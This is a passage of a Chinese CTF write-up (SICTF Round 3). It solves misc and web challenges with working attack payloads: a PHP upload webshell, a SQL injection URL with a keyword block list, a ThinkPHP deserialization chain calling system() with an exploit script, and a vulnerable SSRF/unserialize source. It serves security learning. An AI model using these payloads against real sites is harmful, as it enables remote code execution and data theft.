<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220000-66836kx.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219220000-66836kx.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219220000-dkbbu2s.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219220000-dkbbu2s.gif" alt="a870445b9f74fc497810fde62903e97" loading="lazy"></a>​</p>

<p>4.HXD打开图片发现有一个压缩包，分离一下发现一段BASE64脚本解密最后转图片二维码扫码得到一部分flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219220000-cj6az9d.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219220000-cj6az9d.jpg" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219220000-uu4lwli.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image016-20240219220000-uu4lwli.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219220000-4ugm66y.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image018-20240219220000-4ugm66y.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image020-20240219220000-yubmz4o.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image020-20240219220000-yubmz4o.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>还有一张图片根据题目提示猜测是武器星级，图片识别发现是战双帕弥什的武器根据图鉴写下星级</li>
</ol>

<p>https://wiki.biligame.com/zspms/%E6%AD%A6%E5%99%A8</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image022-20240219220000-3qz0cic.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image022-20240219220000-3qz0cic.gif" alt="" loading="lazy"></a>​</p>

<p>HEX解码发现不对，观察数字只有 4 5 6猜测是摩斯密码， 4 –》.  5 -》空格 6 -》-</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image024-20240219220000-37ked04.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image024-20240219220000-37ked04.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image026-20240219220000-s9azxbu.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image026-20240219220000-s9azxbu.gif" alt="" loading="lazy"></a>​</p>

<p>5.得到最后一部分flag，将的一部分的flag按下划线分割转小写得到flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image028-20240219220000-bsthsti.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image028-20240219220000-bsthsti.gif" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h2 id="web"><span class="me-2">Web</span><a href="#web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="100_upload"><span class="me-2">100_upload</span><a href="#100_upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216113824-vqpwe3p.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216113824-vqpwe3p.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?=</span><span class="sb">`cat /flag`</span><span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216113846-ixjcho5.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216113846-ixjcho5.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="hacker"><span class="me-2">hacker</span><a href="#hacker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>跑了一遍字典，发现注入的东西有很多，空格、or、and，但是没有禁用union和select</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216235107-cb22101.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216235107-cb22101.png" alt="image" loading="lazy"></a>​</p>

<p>那就很明显了，联合查询user()发现最高权限是root，然后我就试试能不能读取文件，发现load_file可以读取</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s2">"&lt;!--flag在flag表里--&gt;"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"123456"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"ctf"</span><span class="p">;</span>

<span class="c1">// 创建连接</span>
<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="mf">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$username</span><span class="o">=</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
<span class="nv">$sensitive_keywords</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span><span class="s2">"handler"</span><span class="p">,</span> <span class="s2">"like"</span><span class="p">,</span> <span class="s2">"or"</span><span class="p">,</span> <span class="s2">"-~"</span><span class="p">,</span> <span class="s2">"--"</span><span class="p">,</span> <span class="s2">"--+"</span><span class="p">,</span> <span class="s2">"information"</span><span class="p">,</span> <span class="s2">"xor"</span><span class="p">,</span> <span class="s2">"and"</span><span class="p">,</span> <span class="s2">";"</span><span class="p">,</span> <span class="s2">"&amp;"</span><span class="p">,</span> <span class="s2">"|"</span><span class="p">,</span> <span class="s2">"order"</span><span class="p">,</span> <span class="s2">"floor"</span><span class="p">,</span><span class="s2">"sys_tables"</span><span class="p">,</span><span class="s2">"sys_columns"</span><span class="p">,</span><span class="s2">"sys.schema_table_statistics_with_buffer"</span><span class="p">,</span><span class="s2">"sys.schema_table_statistics"</span><span class="p">,</span><span class="s2">"mid"</span><span class="p">,</span> <span class="s2">"ascii"</span><span class="p">);</span>

<span class="c1">// 检查参数中是否包含敏感关键词</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$sensitive_keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 如果参数中包含敏感关键词，弹窗提示用户</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('hacker');&lt;/script&gt;"</span><span class="p">);</span>
        <span class="c1">// 可以选择终止脚本执行或者做其他处理</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$sql</span><span class="o">=</span><span class="s2">"select id from flag where id='</span><span class="nv">$username</span><span class="s2">'"</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 输出每一行记录的 love 字段值</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"          "</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"0 结果"</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// echo $result-&gt;num_rows;</span>
<span class="c1">// 关闭数据库连接</span>
<span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>根据它这个表里面的过滤信息，我们直接无列名注入即可</p>

<p>payload:</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nl">http:</span><span class="c1">//yuanshen.life:35522/?username=alice'union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216234953-vwhe40m.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216234953-vwhe40m.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="oyst3rphp"><span class="me-2">Oyst3rPHP</span><a href="#oyst3rphp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218184411-tj9tpfz.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218184411-tj9tpfz.png" alt="image" loading="lazy"></a>​</p>

<p>扫描目录可以得到一个www.zip</p>

<p>由于这是thinkphp框架写的，所以网站的首页是在app—-controller目录里</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218184829-kgdxgh2.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218184829-kgdxgh2.png" alt="image" loading="lazy"></a>​</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kn">namespace</span> <span class="nn">app\controller</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">app\BaseController</span><span class="p">;</span>

<span class="kd">class</span> <span class="nc">Index</span> <span class="kd">extends</span> <span class="nc">BaseController</span>
<span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">index</span><span class="p">()</span>
    <span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"&lt;img src='../Oyster.png'"</span><span class="mf">.</span><span class="s2">"/&gt;"</span><span class="p">;</span>

  
		<span class="nv">$payload</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'payload'</span><span class="p">]);</span>
        <span class="nv">$right</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'left'</span><span class="p">];</span>
        <span class="nv">$left</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'right'</span><span class="p">];</span>
  
		<span class="nv">$key</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'key'</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$right</span> <span class="o">!==</span> <span class="nv">$left</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$right</span><span class="p">)</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$left</span><span class="p">)){</span>
  
			<span class="k">echo</span> <span class="s2">"Congratulations on getting your first oyster"</span><span class="p">;</span>
			<span class="k">echo</span> <span class="s2">"&lt;img src='../Oyster1.png'"</span><span class="mf">.</span><span class="s2">"/&gt;"</span><span class="p">;</span>
  
			<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/.+?THINKPHP/is'</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Oysters don't want you to eat"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'603THINKPHP'</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">){</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"！！！Oysters don't want you to eat！！！"</span><span class="p">);</span>
            <span class="p">}</span>

			<span class="k">echo</span> <span class="s2">"WOW！！！Congratulations on getting your second oyster"</span><span class="p">;</span>
			<span class="k">echo</span> <span class="s2">"&lt;img src='../Oyster2.png'"</span><span class="mf">.</span><span class="s2">"/&gt;"</span><span class="p">;</span>
  
			<span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
			<span class="c1">//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？</span>
			<span class="c1">//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！</span>
			<span class="c1">//小Tips：细狗函数┗|｀O′|┛ 嗷~~</span>
        <span class="p">}</span>
    <span class="p">}</span>

	<span class="k">public</span> <span class="k">function</span> <span class="n">doLogin</span><span class="p">()</span>
    <span class="p">{</span>
    <span class="cm">/*emmm我也不知道这是what，瞎写的*/</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">isPost</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'username'</span><span class="p">);</span>
            <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'password'</span><span class="p">);</span>

   
            <span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s1">'your_username'</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s1">'your_password'</span><span class="p">)</span> <span class="p">{</span>
  
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">success</span><span class="p">(</span><span class="s1">'Login successful'</span><span class="p">,</span> <span class="s1">'index/index'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="s1">'Login failed'</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>



<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>很简单的逻辑，就是md5弱比较、正则回溯，然后反序列化而已</p>

<p>序列化的链子直接摘抄网上的就行了</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 <span class="kn">namespace</span> <span class="nn">think\model\concern</span><span class="p">;</span>
 <span class="kd">trait</span> <span class="nc">Attribute</span>
 <span class="p">{</span>
     <span class="k">private</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"key"</span><span class="o">=&gt;</span><span class="s2">"cat /Oyst3333333r.php"</span><span class="p">];</span>
     <span class="k">private</span> <span class="nv">$withAttr</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"key"</span><span class="o">=&gt;</span><span class="s2">"system"</span><span class="p">];</span>
 <span class="p">}</span>
 <span class="kn">namespace</span> <span class="nn">think</span><span class="p">;</span>
 <span class="k">abstract</span> <span class="kd">class</span> <span class="nc">Model</span>
 <span class="p">{</span>
     <span class="kn">use</span> <span class="nc">model\concern\Attribute</span><span class="p">;</span>
     <span class="k">private</span> <span class="nv">$lazySave</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
     <span class="k">protected</span> <span class="nv">$withEvent</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
     <span class="k">private</span> <span class="nv">$exists</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
     <span class="k">private</span> <span class="nv">$force</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
     <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
     <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$obj</span><span class="o">=</span><span class="s2">""</span><span class="p">){</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">name</span><span class="o">=</span><span class="nv">$obj</span><span class="p">;</span>
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="kn">namespace</span> <span class="nn">think\model</span><span class="p">;</span>
 <span class="kn">use</span> <span class="nc">think\Model</span><span class="p">;</span>
 <span class="kd">class</span> <span class="nc">Pivot</span> <span class="kd">extends</span> <span class="nc">Model</span>
 <span class="p">{}</span>
 <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nc">Pivot</span><span class="p">();</span>
 <span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nc">Pivot</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
 <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">import</span> <span class="n">requests</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s2">"TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319"</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://yuanshen.life:37346/?left=s1885207154a&amp;right=s1502113478a"</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"key"</span><span class="o">:</span><span class="s2">"a"</span><span class="o">*</span><span class="mi">1000000</span><span class="o">+</span><span class="s2">"603THINKPHP"</span><span class="p">,</span>
    <span class="s2">"payload"</span><span class="o">:</span><span class="n">pay</span>
<span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="mf">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="mf">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185033-wz2bfq3.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185033-wz2bfq3.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="ez_ssrf"><span class="me-2">EZ_SSRF</span><a href="#ez_ssrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>源代码</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__file__</span><span class="p">);</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="n">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">class</span> <span class="nc">client</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$url</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$payload</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1/"</span><span class="p">;</span>
        <span class="nv">$payload</span> <span class="o">=</span> <span class="s2">"system(</span><span class="se">\"</span><span class="s2">cat /flag</span><span class="se">\"</span><span class="s2">);"</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">"Exploit"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// hint:hide other file</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Harder'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Harder'</span><span class="p">]);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"You don't know how to pass parameters?"</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>很简单的一道题，反序列化然后通过ssrf漏洞直接读取flag.php文件</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
